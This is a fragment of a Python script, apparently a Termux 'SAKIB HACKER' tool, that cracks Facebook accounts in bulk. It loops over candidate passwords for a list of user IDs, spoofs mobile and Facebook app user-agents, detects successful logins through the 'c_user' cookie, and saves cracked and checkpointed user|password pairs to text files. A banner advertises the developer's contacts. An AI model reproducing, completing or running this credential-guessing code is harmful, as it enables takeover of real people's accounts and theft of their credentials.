...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 11; en-US; itel S661L Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36;]"}
...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :             SAKIB HACKER
     \033[1;91m➣ \033[1;91mFACEBOOK   :            SAKIB HACKERI
     \033[1;92m➣ \033[1;92mWHATSAPP   :            01731787002
     \033[1;91m➣ \033[1;91mGITHUB     :            SAKIB -143
...
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/termux.heker.2023')
    exit()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[SAKIBHACKER] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; itel S661LP) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36+",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; itel S661L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.23.105",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SAKIB HACKER -OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SAKIB HACKER_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        pass
                    print('\r%s [SAKIB HACKER-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SAKIB HACKER_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
